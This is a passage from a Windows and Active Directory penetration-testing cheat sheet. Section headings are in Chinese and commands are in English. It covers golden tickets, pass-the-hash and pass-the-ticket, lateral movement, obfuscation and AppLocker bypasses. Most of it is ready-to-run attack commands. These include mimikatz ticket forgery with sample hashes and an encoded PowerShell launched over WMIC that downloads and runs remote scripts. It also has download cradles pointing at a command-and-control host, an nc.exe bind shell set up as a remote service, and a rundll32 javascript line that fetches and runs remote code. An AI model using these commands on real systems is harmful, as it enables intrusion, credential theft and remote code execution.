class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">We can dump Kerberos tickets and inject them in session when deemed relevant however tickets have a low life span unless explically requested for 7 days. </span><br><span class="line"></span><br><span class="line">They can be injected into session with mimikatz or Rebeus. </span><br><span class="line"></span><br><span class="line">But let&apos;s say we have pwned a DC and got the KRBTGT Hash we can generate a golden ticket with a 10 year life span.</span><br><span class="line"></span><br><span class="line">kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:utilisateur.chocolate.kirbi </span><br><span class="line"></span><br><span class="line">SID is the domain SID</span><br><span class="line"></span><br><span class="line">Inject Ticket</span><br><span class="line"></span><br><span class="line">kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi</span><br><span class="line"></span><br><span class="line">Can also inject kirbi with Rebeus</span><br></pre></td></tr></table></figure><h1 id="0x07-横向运动"><a href="#0x07-横向运动" class="headerlink" title="0x07 横向运动"></a>0x07 横向运动</h1><h2 id="7-1-Plink"><a href="#7-1-Plink" class="headerlink" title="7.1 Plink"></a>7.1 Plink</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS</span><br><span class="line"></span><br><span class="line">#Windows 1803 Built in SSH Client (By Default)</span><br><span class="line"></span><br><span class="line">ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS</span><br></pre></td></tr></table></figure><h2 id="7-2-Powershell端口转发"><a href="#7-2-Powershell端口转发" class="headerlink" title="7.2 Powershell端口转发"></a>7.2 Powershell端口转发</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=fromport listenaddress=fromip connectport=toport connectaddress=toip</span><br><span class="line"></span><br><span class="line">Permanent ^^</span><br><span class="line"></span><br><span class="line">Requires iphlpsvc service to be enabled</span><br><span class="line"></span><br><span class="line">fromport: the port number to listen on, e.g. 80</span><br><span class="line">fromip: the ip address to listen on, e.g. 192.168.1.1</span><br><span class="line">toport: the port number to forward to</span><br><span class="line">toip: the ip address to forward to</span><br></pre></td></tr></table></figure><h2 id="7-3-Invoke-SocksProxy"><a href="#7-3-Invoke-SocksProxy" class="headerlink" title="7.3 Invoke-SocksProxy"></a>7.3 Invoke-SocksProxy</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/p3nt4/Invoke-SocksProxy/</span><br><span class="line"></span><br><span class="line">Local Socks4 Proxy on 1080</span><br><span class="line"></span><br><span class="line">Import-Module .\Invoke-SocksProxy.psm1</span><br><span class="line">Invoke-SocksProxy -bindPort 1080</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Reverse Socks Proxy on Remote Machine Port 1080</span><br><span class="line"></span><br><span class="line"># On the remote host: </span><br><span class="line"># Generate a private key and self signed cert</span><br><span class="line">openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout private.key -out cert.pem</span><br><span class="line"></span><br><span class="line"># Get the certificate fingerprint to verify it:</span><br><span class="line">openssl x509 -in cert.pem -noout -sha1 -fingerprint | cut -d &quot;=&quot; -f 2 | tr -d &quot;:&quot;</span><br><span class="line"></span><br><span class="line"># Start the handler</span><br><span class="line">python ReverseSocksProxyHandler.py 443 1080 ./cert.pem ./private.key</span><br><span class="line"></span><br><span class="line"># On the local host:</span><br><span class="line">Import-Module .\Invoke-SocksProxy.psm1</span><br><span class="line">Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 </span><br><span class="line"></span><br><span class="line"># Go through the system proxy:</span><br><span class="line">Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy</span><br><span class="line"></span><br><span class="line"># Validate certificate</span><br><span class="line">Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy -certFingerprint &apos;93061FDB30D69A435ACF96430744C5CC5473D44E&apos;</span><br></pre></td></tr></table></figure><h2 id="7-4-Socat-for-Windows"><a href="#7-4-Socat-for-Windows" class="headerlink" title="7.4 Socat for Windows"></a>7.4 Socat for Windows</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/StudioEtrange/socat-windows</span><br><span class="line"></span><br><span class="line">Generate SSL Cert for Encryption</span><br><span class="line">openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.key</span><br><span class="line"></span><br><span class="line">Server : socat OPENSSL-LISTEN:443,cert=/cert.pem -</span><br><span class="line">Client : socat - OPENSSL:localhost:443</span><br><span class="line"></span><br><span class="line">#Port Forward</span><br><span class="line"></span><br><span class="line">socat OPENSSL-LISTEN:443,cert=/cert.pem,fork TCP:202.54.1.5:443</span><br><span class="line"></span><br><span class="line">All SSL Connections will be redirected to 202.54.1.5:443</span><br><span class="line"></span><br><span class="line">#Non SSL Port Forward</span><br><span class="line">socat TCP-LISTEN:80,fork TCP:202.54.1.5:80</span><br></pre></td></tr></table></figure><h2 id="7-5-SharpExec"><a href="#7-5-SharpExec" class="headerlink" title="7.5 SharpExec"></a>7.5 SharpExec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/anthemtotheego/SharpExec</span><br><span class="line"></span><br><span class="line">C# Implementation of Conventional Lateral Movement Techniques, such as </span><br><span class="line"></span><br><span class="line">-WMIExec - Semi-Interactive shell that runs as the user. Best described as a less mature version of Impacket&apos;s wmiexec.py tool.</span><br><span class="line"></span><br><span class="line">-SMBExec - Semi-Interactive shell that runs as NT Authority\System. Best described as a less mature version of Impacket&apos;s smbexec.py tool.</span><br><span class="line"></span><br><span class="line">-PSExec (like functionality) - Gives the operator the ability to execute remote commands as NT Authority\System or upload a file and execute it with or without arguments as NT Authority\System.</span><br><span class="line"></span><br><span class="line">-WMI - Gives the operator the ability to execute remote commands as the user or upload a file and execute it with or without arguments as the user.</span><br></pre></td></tr></table></figure><h2 id="7-6-安全套接字漏斗"><a href="#7-6-安全套接字漏斗" class="headerlink" title="7.6 安全套接字漏斗"></a>7.6 安全套接字漏斗</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html#ssf</span><br><span class="line">#git clone https://github.com/securesocketfunneling/ssf.git</span><br><span class="line"></span><br><span class="line">Massive shout out to 0xdf for explaining this perfectly in his article. Couldnt have done it better myself.</span><br></pre></td></tr></table></figure><h2 id="7-7-凿子（通过SSH保护的HTTP上的快速TCP隧道）"><a href="#7-7-凿子（通过SSH保护的HTTP上的快速TCP隧道）" class="headerlink" title="7.7 凿子（通过SSH保护的HTTP上的快速TCP隧道）"></a>7.7 凿子（通过SSH保护的HTTP上的快速TCP隧道）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html</span><br></pre></td></tr></table></figure><h2 id="7-8-CrackMapExec"><a href="#7-8-CrackMapExec" class="headerlink" title="7.8 CrackMapExec"></a>7.8 CrackMapExec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-lateral-movement/</span><br></pre></td></tr></table></figure><h2 id="7-9-WMIC-Spawn-Process"><a href="#7-9-WMIC-Spawn-Process" class="headerlink" title="7.9 WMIC Spawn Process"></a>7.9 WMIC Spawn Process</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:WS02 /user:DOMAIN\m0chan /password:m0chan process call create &quot;powershell.exe -Enc aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ARwBvAG8AZABuAGkAZwBoAHQALgBwAHMAMQAiACkAKQA7ACAAaQBmACgAWwBCAHkAcABhAHMAcwAuAEEATQBTAEkAXQA6ADoARABpAHMAYQBiAGwAZQAoACkAIAAtAGUAcQAgACIAMAAiACkAIAB7ACAAaQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ASABSAEUAdgBlAG4AdABzAC4AcABzADEAIgApACkAIAB9AA==&quot;</span><br></pre></td></tr></table></figure><h2 id="7-10-WinRS"><a href="#7-10-WinRS" class="headerlink" title="7.10 WinRS"></a>7.10 WinRS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs</span><br><span class="line"></span><br><span class="line">winrs [/&lt;parameter&gt;[:&lt;value&gt;]] &lt;command&gt;  </span><br><span class="line"></span><br><span class="line">winrs /r:https://contoso.com command</span><br><span class="line"></span><br><span class="line">winrs /r:http://[1080:0:0:0:8:800:200C:417A]:80 command  </span><br><span class="line"></span><br><span class="line">winrs /r:myserver /ad /u:administrator /p:$%fgh7 dir \\anotherserver\share</span><br></pre></td></tr></table></figure><h2 id="7-11-Invoke-WMIExec-ps1"><a href="#7-11-Invoke-WMIExec-ps1" class="headerlink" title="7.11 Invoke-WMIExec.ps1"></a>7.11 Invoke-WMIExec.ps1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WMIExec -Target 10.10.14.14 -Username rweston_da -Hash 3ff61fa259deee15e4042159d</span><br><span class="line">7b832fa -Command &quot;net user user pass /add /domain&quot;</span><br><span class="line"></span><br><span class="line">PS C:\users\user\Downloads&gt; Invoke-WMIExec -Target 10.10.120.1 -Username m0chan -Hash 3ff61fa259deee15e4042159d</span><br><span class="line">7b832fa -Command &quot;net group &quot;&quot;Domain Admins&quot;&quot; m0chan /add /domain&quot;</span><br></pre></td></tr></table></figure><h2 id="7-12-Powershell调用命令（需要端口5985）"><a href="#7-12-Powershell调用命令（需要端口5985）" class="headerlink" title="7.12 Powershell调用命令（需要端口5985）"></a>7.12 Powershell调用命令（需要端口5985）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$secpasswd = ConvertTo-SecureString &apos;pass&apos; -AsPlainText -Force</span><br><span class="line">$cred = New-Object System.Management.Automation.PSCredential(&apos;m0chan\user&apos;, $secpasswd)</span><br><span class="line"></span><br><span class="line">Invoke-Command -ComputerName FS01 -Credential $cred -ScriptBlock &#123;whoami&#125;</span><br></pre></td></tr></table></figure><h2 id="7-13-PSExec"><a href="#7-13-PSExec" class="headerlink" title="7.13 PSExec"></a>7.13 PSExec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe \\dc01.m0chanAD.local cmd.exe</span><br></pre></td></tr></table></figure><h2 id="7-14-Powershell-Remoting"><a href="#7-14-Powershell-Remoting" class="headerlink" title="7.14 Powershell Remoting"></a>7.14 Powershell Remoting</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$secpasswd = ConvertTo-SecureString &apos;password&apos; -AsPlainText -Force</span><br><span class="line">$cred = New-Object System.Management.Automation.PSCredential(&apos;WS02\USER&apos;, $secpasswd)</span><br><span class="line"></span><br><span class="line">$Session = New-PSSession -ComputerName FileServer -Credential $cred</span><br><span class="line">Enter-PSSession $Session</span><br></pre></td></tr></table></figure><h2 id="7-15-通过SMB配置远程服务（在目标计算机上需要本地管理员）"><a href="#7-15-通过SMB配置远程服务（在目标计算机上需要本地管理员）" class="headerlink" title="7.15 通过SMB配置远程服务（在目标计算机上需要本地管理员）"></a>7.15 通过SMB配置远程服务（在目标计算机上需要本地管理员）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.0.15 [password] /u:DOMAIN\m0chan</span><br><span class="line"></span><br><span class="line">sc \\192.168.0.15 create &lt;service_name&gt; binpath= &quot;cmd.exe /k COMMAND&quot;</span><br><span class="line">sc \\192.168.0.15 create &lt;service_name&gt; binpath= &quot;cmd.exe /k &lt;c:\tools\nc.exe -L -p &lt;port&gt; -e cmd.exe&gt;&quot;</span><br><span class="line">sc \\192.168.0.15 start &lt;service_name&gt;</span><br></pre></td></tr></table></figure><h2 id="7-16-Pass-The-Hash"><a href="#7-16-Pass-The-Hash" class="headerlink" title="7.16 Pass-The-Hash"></a>7.16 Pass-The-Hash</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec &lt;ip&gt; -u &lt;user&gt; -H &quot;&lt;lm&gt;&quot; -x &quot;&lt;msfvenom psh-cmd&gt;&quot;</span><br><span class="line"></span><br><span class="line">impacket-wmiexec &lt;user&gt;@&lt;ip&gt; -hashes &lt;lm:nt&gt;</span><br><span class="line"></span><br><span class="line">pth-winexe -U &lt;user&gt;%&lt;ntlm&gt; //&lt;ip&gt; &quot;&lt;msfvenom psh-cmd&gt;&quot;</span><br><span class="line"></span><br><span class="line">python wmiexec.py -hashes :&lt;hash&gt; &lt;user&gt;@&lt;ip&gt;</span><br><span class="line"></span><br><span class="line">xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /pth:&lt;ntlm&gt; /v:&lt;ip&gt;:3389 /dynamic-resolution</span><br><span class="line"></span><br><span class="line">sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a</span><br></pre></td></tr></table></figure><h2 id="7-17-Pass-The-Ticket"><a href="#7-17-Pass-The-Ticket" class="headerlink" title="7.17 Pass-The-Ticket"></a>7.17 Pass-The-Ticket</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#Check my Blog Post Kerberos Attacks in Depth for Further Information</span><br><span class="line"></span><br><span class="line">Rebeus monitor /interval:30 </span><br><span class="line"></span><br><span class="line">Monitoring logon sessions every 30 seconds so I can pinch Kerb tickets</span><br><span class="line"></span><br><span class="line">Reubus will now give you a Kerberos ticket in base64 which you can pass with</span><br><span class="line"></span><br><span class="line">Rubeus.exe ptt /ticket:[base64blobhere]</span><br><span class="line"></span><br><span class="line">We can now request TGS service tickets to access network resources as this user</span><br></pre></td></tr></table></figure><h1 id="0x08-混淆-规避技术"><a href="#0x08-混淆-规避技术" class="headerlink" title="0x08 混淆/规避技术"></a>0x08 混淆/规避技术</h1><h2 id="8-1-调用混淆"><a href="#8-1-调用混淆" class="headerlink" title="8.1 调用混淆"></a>8.1 调用混淆</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/danielbohannon/Invoke-Obfuscation</span><br><span class="line"></span><br><span class="line">Can obfusacte Scripts &amp; Commands </span><br><span class="line"></span><br><span class="line">Obfusacte script from remote url </span><br><span class="line"></span><br><span class="line">SET SCRIPTPATH https://thisdosentexist.m0chan.com/Invoke-Mimikatz.ps1</span><br><span class="line"></span><br><span class="line">Can also set Sscript block base64 PS</span><br><span class="line"></span><br><span class="line">SET SCRIPTBLOCK powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAWQBvAHUAIABjAGEAbgAgAHUAcwBlACAAYgBhAHMAaQBjACAALQBlAG4A==</span><br></pre></td></tr></table></figure><h2 id="8-2-调用-CradleCraft"><a href="#8-2-调用-CradleCraft" class="headerlink" title="8.2 调用-CradleCraft"></a>8.2 调用-CradleCraft</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/danielbohannon/Invoke-CradleCrafter</span><br><span class="line"></span><br><span class="line">Similar to Invoke-Obfusaction but allows you to obfusacte cradles for downloading i/e</span><br><span class="line"></span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(&apos;http://c2server.com/Invoke-Mimikatz.ps1&apos;)</span><br></pre></td></tr></table></figure><h2 id="8-3-调用DOSfuscation"><a href="#8-3-调用DOSfuscation" class="headerlink" title="8.3 调用DOSfuscation"></a>8.3 调用DOSfuscation</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/danielbohannon/Invoke-DOSfuscation</span><br></pre></td></tr></table></figure><h2 id="8-4-Unicorn"><a href="#8-4-Unicorn" class="headerlink" title="8.4 Unicorn"></a>8.4 Unicorn</h2><blockquote><p><a href="https://github.com/trustedsec/unicorn" target="_blank" rel="noopener">https://github.com/trustedsec/unicorn</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unicorn.py Nishang.ps1</span><br></pre></td></tr></table></figure><h1 id="0x09-AppLocker-约束模式绕过"><a href="#0x09-AppLocker-约束模式绕过" class="headerlink" title="0x09 AppLocker /约束模式绕过"></a>0x09 AppLocker /约束模式绕过</h1><h2 id="9-1-验证您是否处于受限模式"><a href="#9-1-验证您是否处于受限模式" class="headerlink" title="9.1 验证您是否处于受限模式"></a>9.1 验证您是否处于受限模式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ExecutionContext.SessionState.LanguageMode</span><br></pre></td></tr></table></figure><h2 id="9-2-Powershell非常少旁路"><a href="#9-2-Powershell非常少旁路" class="headerlink" title="9.2 Powershell非常少旁路"></a>9.2 Powershell非常少旁路</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/decoder-it/powershellveryless.git</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference: C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\system.management.automation.dll </span><br><span class="line">/out:C:\Users\m0chan\Scripts\powershellveryless.exe </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\system.management.automation.dll /out:c:\setup\powershellveryless.exe c:\scripts\powershellveryless.cs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Execute -&gt; powershellveryless.exe script.ps1</span><br><span class="line"></span><br><span class="line">script.ps1 = Script of your Choice</span><br></pre></td></tr></table></figure><h2 id="9-3-世界可写文件夹（在Windows-10-1803上为默认）"><a href="#9-3-世界可写文件夹（在Windows-10-1803上为默认）" class="headerlink" title="9.3 世界可写文件夹（在Windows 10 1803上为默认）"></a>9.3 世界可写文件夹（在Windows 10 1803上为默认）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md</span><br><span class="line"></span><br><span class="line">C:\Windows\Tasks </span><br><span class="line">C:\Windows\Temp </span><br><span class="line">C:\windows\tracing</span><br><span class="line">C:\Windows\Registration\CRMLog</span><br><span class="line">C:\Windows\System32\FxsTmp</span><br><span class="line">C:\Windows\System32\com\dmp</span><br><span class="line">C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys</span><br><span class="line">C:\Windows\System32\spool\PRINTERS</span><br><span class="line">C:\Windows\System32\spool\SERVERS</span><br><span class="line">C:\Windows\System32\spool\drivers\color</span><br><span class="line">C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter</span><br><span class="line">C:\Windows\SysWOW64\FxsTmp</span><br><span class="line">C:\Windows\SysWOW64\com\dmp</span><br><span class="line">C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter</span><br><span class="line">C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System</span><br></pre></td></tr></table></figure><h2 id="9-4-降级攻击"><a href="#9-4-降级攻击" class="headerlink" title="9.4 降级攻击"></a>9.4 降级攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Downgrading to PS Version 2 circumvates Constrained Mode</span><br><span class="line"></span><br><span class="line">powershell.exe -version 2</span><br><span class="line"></span><br><span class="line">Verifiy versions with $PSVersionTable</span><br><span class="line">Get-Host</span><br></pre></td></tr></table></figure><h2 id="9-5-AppLocker-COR配置文件绕过"><a href="#9-5-AppLocker-COR配置文件绕过" class="headerlink" title="9.5 AppLocker COR配置文件绕过"></a>9.5 AppLocker COR配置文件绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">set COR_ENABLE_PROFILING=1</span><br><span class="line">COR_PROFILER=&#123;cf0d821e-299b-5307-a3d8-b283c03916db&#125;</span><br><span class="line">set COR_PROFILER_PATH=C:\Users\m0chan\pwn\reverseshell.dll</span><br><span class="line">tzsync</span><br><span class="line">powershell</span><br><span class="line"></span><br><span class="line">Where .DLL is your payload i/e reverse shell, beacon etc.</span><br></pre></td></tr></table></figure><h2 id="9-6-MSBuild-Powershell-CMD旁路"><a href="#9-6-MSBuild-Powershell-CMD旁路" class="headerlink" title="9.6 MSBuild Powershell / CMD旁路"></a>9.6 MSBuild Powershell / CMD旁路</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">You can use this if cmd is not disabled but powershell is</span><br><span class="line"></span><br><span class="line">https://github.com/Cn33liz/MSBuildShell/blob/master/MSBuildShell.csproj</span><br><span class="line"></span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe pshell.csproj</span><br><span class="line"></span><br><span class="line">Also https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c</span><br><span class="line"></span><br><span class="line">MSBuild PSAttack :D :D</span><br></pre></td></tr></table></figure><h2 id="9-7-PSAttack"><a href="#9-7-PSAttack" class="headerlink" title="9.7 PSAttack"></a>9.7 PSAttack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/jaredhaight/PSAttack</span><br><span class="line"></span><br><span class="line">Use if Powershell.exe is not available. this does not rely on powershell.exe, but Instead directly calls powershell through .NET Framework circumvating most application whitelisting etc.</span><br><span class="line"></span><br><span class="line">Has numerous modules prebuilt in and is built in C Sharp / .NET so can be reflectively loaded :)</span><br></pre></td></tr></table></figure><h2 id="9-8-NoPowerShell"><a href="#9-8-NoPowerShell" class="headerlink" title="9.8 NoPowerShell"></a>9.8 NoPowerShell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/bitsadmin/nopowershell</span><br><span class="line"></span><br><span class="line">Primiarily to be used with Cobalt &amp; Execute Assembly but can also be reflectively loaded from any other C2 infra.</span><br></pre></td></tr></table></figure><h2 id="9-9-runDLL32绕过"><a href="#9-9-runDLL32绕过" class="headerlink" title="9.9 runDLL32绕过"></a>9.9 runDLL32绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#Reference: https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/</span><br><span class="line"></span><br><span class="line">rundll32.exe is a .exe found on all Windows based systems located at C:\Windows\system32\rundll32.exe</span><br><span class="line"></span><br><span class="line">rundll32 shell32.dll,Control_RunDLL payload.dll</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &lt;HTML Code&gt;</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&apos;http://ip:port/&apos;);&quot;</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml.dll,RunHTMLApplication 